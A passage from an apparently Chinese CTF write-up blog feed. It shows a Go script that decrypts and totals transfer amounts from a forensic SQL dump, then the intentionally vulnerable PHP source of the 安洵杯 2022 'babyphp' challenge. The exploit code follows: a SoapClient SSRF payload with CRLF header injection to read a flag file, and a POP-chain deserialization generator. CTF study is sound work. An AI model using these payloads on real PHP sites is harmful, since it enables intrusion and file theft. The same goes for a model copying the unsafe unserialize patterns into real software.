src="/../../../../pic/Pasted%20image%2020230211161053.png"></p><p>找到加密方法</p><p><img src="/../../../../pic/Pasted%20image%2020230211161125.png"></p><p>找到 flag 为 jyzg123456</p><h3 id="2-4-网站取证-4"><a href="#2-4-网站取证-4" class="headerlink" title="2.4 网站取证_4"></a>2.4 网站取证_4</h3><ul><li>题目描述</li></ul><p>请计算张宝在北京时间2022-04-02 00:00:00-2022-04-18 23:59:59累计转账给王子豪多少RMB？（换算比例请从数据库中获取，答案参考格式：123.45）</p><ul><li>题目解析</li></ul><p>根据题目给出的 bak.sql 进行查找</p><p>使用脚本跑一下</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span><span class="token string">"bufio"</span><span class="token string">"crypto/md5"</span><span class="token string">"encoding/base64"</span><span class="token string">"encoding/hex"</span><span class="token string">"fmt"</span><span class="token string">"io"</span><span class="token string">"os"</span><span class="token string">"regexp"</span><span class="token string">"strconv"</span><span class="token string">"syscall"</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>data <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token builtin">string</span> <span class="token punctuation">{</span>key <span class="token operator">:=</span> <span class="token string">"jyzg123456"</span>hash <span class="token operator">:=</span> md5<span class="token punctuation">.</span><span class="token function">New</span><span class="token punctuation">(</span><span class="token punctuation">)</span>hash<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span>key <span class="token operator">=</span> hex<span class="token punctuation">.</span><span class="token function">EncodeToString</span><span class="token punctuation">(</span>hash<span class="token punctuation">.</span><span class="token function">Sum</span><span class="token punctuation">(</span><span class="token boolean">nil</span><span class="token punctuation">)</span><span class="token punctuation">)</span>decodeString<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> base64<span class="token punctuation">.</span>StdEncoding<span class="token punctuation">.</span><span class="token function">DecodeString</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>x <span class="token operator">:=</span> <span class="token number">0</span>char <span class="token operator">:=</span> <span class="token string">""</span>result <span class="token operator">:=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token operator">:=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token function">len</span><span class="token punctuation">(</span>decodeString<span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span> <span class="token punctuation">{</span><span class="token keyword">if</span> x <span class="token operator">==</span> <span class="token function">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token punctuation">{</span>x <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">}</span>char <span class="token operator">+=</span> <span class="token function">string</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">)</span>x<span class="token operator">++</span><span class="token punctuation">}</span><span class="token keyword">for</span> i <span class="token operator">:=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token function">len</span><span class="token punctuation">(</span>decodeString<span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span> <span class="token punctuation">{</span>result <span class="token operator">+=</span> <span class="token function">string</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">int32</span><span class="token punctuation">(</span>decodeString<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">256</span> <span class="token operator">-</span> <span class="token function">int32</span><span class="token punctuation">(</span>char<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">return</span> result<span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>file<span class="token punctuation">,</span> err <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">OpenFile</span><span class="token punctuation">(</span><span class="token string">"bak.sql"</span><span class="token punctuation">,</span> syscall<span class="token punctuation">.</span>O_RDONLY<span class="token punctuation">,</span> <span class="token number">0666</span><span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"Error = %v\n"</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">}</span><span class="token keyword">defer</span> file<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>reader <span class="token operator">:=</span> bufio<span class="token punctuation">.</span><span class="token function">NewReader</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span>bargains <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">)</span><span class="token keyword">var</span> totalMoney <span class="token builtin">float64</span><span class="token keyword">for</span> <span class="token boolean">true</span> <span class="token punctuation">{</span>line<span class="token punctuation">,</span> err <span class="token operator">:=</span> reader<span class="token punctuation">.</span><span class="token function">ReadString</span><span class="token punctuation">(</span><span class="token char">'\n'</span><span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">==</span> io<span class="token punctuation">.</span>EOF <span class="token punctuation">{</span><span class="token keyword">break</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"Error = %v\n"</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">}</span><span class="token comment">// 读取汇率</span>r1 <span class="token operator">:=</span> regexp<span class="token punctuation">.</span><span class="token function">MustCompile</span><span class="token punctuation">(</span><span class="token string">`'RMB', ([.\w]*), '2022-04-(\w*) 00:00:00'`</span><span class="token punctuation">)</span><span class="token keyword">if</span> r1<span class="token punctuation">.</span><span class="token function">MatchString</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span> <span class="token punctuation">{</span>submatch <span class="token operator">:=</span> r1<span class="token punctuation">.</span><span class="token function">FindStringSubmatch</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span>bargains<span class="token punctuation">[</span>submatch<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> submatch<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token keyword">continue</span><span class="token punctuation">}</span><span class="token comment">// 读取订单</span>r2 <span class="token operator">:=</span> regexp<span class="token punctuation">.</span><span class="token function">MustCompile</span><span class="token punctuation">(</span><span class="token string">`'GG币', NULL, '2022-04-(\w*) ([\w:]*)', (\d), (\d), '(\w*)'`</span><span class="token punctuation">)</span><span class="token keyword">if</span> r2<span class="token punctuation">.</span><span class="token function">MatchString</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span> <span class="token punctuation">{</span>submatch <span class="token operator">:=</span> r2<span class="token punctuation">.</span><span class="token function">FindStringSubmatch</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token keyword">if</span> submatch<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">==</span> fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> submatch<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">==</span> fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">if</span> submatch<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&gt;=</span> <span class="token string">"02"</span> <span class="token operator">&amp;&amp;</span> submatch<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token string">"18"</span> <span class="token punctuation">{</span>bargain<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> strconv<span class="token punctuation">.</span><span class="token function">ParseFloat</span><span class="token punctuation">(</span>bargains<span class="token punctuation">[</span>submatch<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">)</span>decodedMoney<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> strconv<span class="token punctuation">.</span><span class="token function">ParseFloat</span><span class="token punctuation">(</span><span class="token function">decrypt</span><span class="token punctuation">(</span>submatch<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">)</span>totalMoney <span class="token operator">+=</span> bargain <span class="token operator">*</span> decodedMoneyfmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"%v %v %v\n"</span><span class="token punctuation">,</span> submatch<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> bargain<span class="token punctuation">,</span> decodedMoney<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span>fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"%f"</span><span class="token punctuation">,</span> totalMoney<span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后获得 flag 为 <code>15758353.76</code></p>]]></content>
      
      
      <categories>
          
          <category> CTF 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 蓝帽杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安洵杯 2022</title>
      <link href="/2023/01/21/catchtheflag/games/an-xun-bei/an-xun-bei-2022/"/>
      <url>/2023/01/21/catchtheflag/games/an-xun-bei/an-xun-bei-2022/</url>
      
        <content type="html"><![CDATA[<h1 id="安洵杯-2022"><a href="#安洵杯-2022" class="headerlink" title="安洵杯 2022"></a>安洵杯 2022</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="1-babyphp"><a href="#1-babyphp" class="headerlink" title="1. babyphp"></a>1. babyphp</h3><p>#SESSION反序列化 #PHP原生类</p><p>题目直接给出了源码</p><p>index.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//something in flag.php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">A</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$b</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">a</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"babyhacker"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">a</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">a</span> <span class="token operator">==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">a</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">b</span><span class="token operator">-&gt;</span><span class="token function">uwant</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">B</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$b</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$k</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">b</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">k</span><span class="token punctuation">;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">C</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$c</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$cc</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">c</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$cc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">uwant</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">a</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"phpinfo"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token function">reset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'d0g3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'baby'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'d0g3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sess'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sess'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"pop"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"pop"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>flag.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//flag在根目录下</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"REMOTE_ADDR"</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string double-quoted-string">"127.0.0.1"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$f1ag</span><span class="token operator">=</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"F1AG"</span><span class="token punctuation">]</span><span class="token operator">=</span> <span class="token variable">$f1ag</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token string double-quoted-string">"only localhost!!"</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>题解思路</li></ul><p>需要通过 index.php 触发 SSRF 访问 flag.php，在 <code>new $_GET['a']($_GET['b'])</code> 任意文件读取</p><ul><li>题目解析</li></ul><p>进入 if 判断中写入序列化内容到 SESSION 中</p><p>然后在  else 中触发反序列化执行 SSRF</p><p>生成写入 SESSION 中的内容</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SoapClient</span><span class="token punctuation">(</span><span class="token constant">null</span><span class="token punctuation">,</span>    <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token comment">//        'location' =&gt; 'http://127.0.0.1/flag.php?a=DirectoryIterator&amp;b=glob:///f*',</span>        <span class="token string single-quoted-string">'location'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'http://127.0.0.1/flag.php?a=SplFileObject&amp;b=php://filter/convert.base64-encode/resource=/f1111llllllaagg'</span><span class="token punctuation">,</span>        <span class="token string single-quoted-string">'uri'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'ssrf'</span><span class="token punctuation">,</span>        <span class="token comment">// 将回显内容写入到指定 SESSION 中，方便后续读取回显内容</span>        <span class="token string single-quoted-string">'user_agent'</span> <span class="token operator">=&gt;</span> <span class="token string double-quoted-string">"1\r\nCookie: PHPSESSID=hacker\r\n"</span>    <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"|"</span> <span class="token operator">.</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>生成 pop </p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//something in flag.php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">A</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$b</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">a</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"babyhacker"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">a</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">a</span> <span class="token operator">==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">a</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">b</span><span class="token operator">-&gt;</span><span class="token function">uwant</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">B</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$b</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$k</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">b</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">k</span><span class="token punctuation">;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">C</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$c</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$cc</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">c</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$cc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">uwant</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">a</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"phpinfo"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token function">reset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">B</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$o</span><span class="token operator">-&gt;</span><span class="token property">a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">C</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$o</span><span class="token operator">-&gt;</span><span class="token property">a</span><span class="token operator">-&gt;</span><span class="token property">c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$o</span><span class="token operator">-&gt;</span><span class="token property">a</span><span class="token operator">-&gt;</span><span class="token property">c</span><span class="token operator">-&gt;</span><span class="token property">a</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"0e215962017"</span><span class="token punctuation">;</span><span class="token variable">$o</span><span class="token operator">-&gt;</span><span class="token property">a</span><span class="token operator">-&gt;</span><span class="token property">c</span><span class="token operator">-&gt;</span><span class="token property">b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">C</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$o</span><span class="token operator">-&gt;</span><span class="token property">a</span><span class="token operator">-&gt;</span><span class="token property">c</span><span class="token operator">-&gt;</span><span class="token property">b</span><span class="token operator">-&gt;</span><span class="token property">a</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"nah"</span><span class="token punctuation">;</span><span class="token variable">$payload</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$payload</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'O:1:"A":2:'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'O:1:"A":3:'</span><span class="token punctuation">,</span> <span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$payload</span><span class="token punctuation">;</span></span><span aria-hidden="true" 